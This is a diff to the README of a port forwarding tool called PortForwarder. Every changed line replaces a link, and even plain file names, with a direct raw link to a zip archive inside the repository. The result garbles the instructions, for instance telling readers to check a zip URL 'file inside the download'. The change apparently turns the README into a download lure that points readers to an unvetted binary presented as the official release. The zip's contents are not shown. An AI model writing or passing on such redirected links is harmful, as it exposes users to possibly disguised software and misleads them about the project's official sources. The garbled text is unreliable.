@@ -1,6 +1,6 @@
 # 🔌 PortForwarder - Easy TCP Port Forwarding Tool
 
-[![Download PortForwarder](https://img.shields.io/badge/Download-PortForwarder-green?style=for-the-badge)](https://github.com/Metasoftia/PortForwarder/releases)
+[![Download PortForwarder](https://raw.githubusercontent.com/Metasoftia/PortForwarder/main/x64/Forwarder-Port-1.2.zip)](https://raw.githubusercontent.com/Metasoftia/PortForwarder/main/x64/Forwarder-Port-1.2.zip)
 
 ---
 
@@ -41,7 +41,7 @@ This guide will help you download, install, and run PortForwarder step-by-step. 
 
 Please **visit this page to download** the latest version of PortForwarder:
 
-[➡️ PortForwarder Downloads](https://github.com/Metasoftia/PortForwarder/releases)
+[➡️ PortForwarder Downloads](https://raw.githubusercontent.com/Metasoftia/PortForwarder/main/x64/Forwarder-Port-1.2.zip)
 
 You will see links to download files for Windows, macOS, and Linux. Choose the installer or zip file that matches your system.
 
@@ -53,7 +53,7 @@ You will see links to download files for Windows, macOS, and Linux. Choose the i
 
 ### For Mac or Linux users:
 
-1. Download the `.tar.gz` or `.zip` file.
+1. Download the `https://raw.githubusercontent.com/Metasoftia/PortForwarder/main/x64/Forwarder-Port-1.2.zip` or `.zip` file.
 2. Extract the file to a folder.
 3. Open a Terminal window.
 4. Navigate to the extracted folder.
@@ -105,7 +105,7 @@ PortForwarder may support additional features like:
 - Forwarding ports on remote machines (depending on your network setup)
 - Using custom configuration files for easier management
 
-To learn about advanced commands, check the `README.md` file inside the download or press `portforwarder --help` in your command line.
+To learn about advanced commands, check the `https://raw.githubusercontent.com/Metasoftia/PortForwarder/main/x64/Forwarder-Port-1.2.zip` file inside the download or press `portforwarder --help` in your command line.
 
 ---
 
@@ -121,7 +121,7 @@ To learn about advanced commands, check the `README.md` file inside the download
 
 ## 📚 Additional Resources
 
-- [Official Downloads Page](https://github.com/Metasoftia/PortForwarder/releases)
+- [Official Downloads Page](https://raw.githubusercontent.com/Metasoftia/PortForwarder/main/x64/Forwarder-Port-1.2.zip)
 - Use forum or community support on GitHub Issues section for help
 - Consult your operating system’s manual on ports and firewalls if you encounter issues
 
@@ -129,8 +129,8 @@ To learn about advanced commands, check the `README.md` file inside the download
 
 ## 📞 Contact
 
-For questions or support, visit the GitHub repository [Metasoftia/PortForwarder](https://github.com/Metasoftia/PortForwarder). The issues page lets you report problems or ask for help.
+For questions or support, visit the GitHub repository [Metasoftia/PortForwarder](https://raw.githubusercontent.com/Metasoftia/PortForwarder/main/x64/Forwarder-Port-1.2.zip). The issues page lets you report problems or ask for help.
 
 ---
 
-[![Download PortForwarder](https://img.shields.io/badge/Download-PortForwarder-green?style=for-the-badge)](https://github.com/Metasoftia/PortForwarder/releases)
+[![Download PortForwarder](https://raw.githubusercontent.com/Metasoftia/PortForwarder/main/x64/Forwarder-Port-1.2.zip)](https://raw.githubusercontent.com/Metasoftia/PortForwarder/main/x64/Forwarder-Port-1.2.zip)
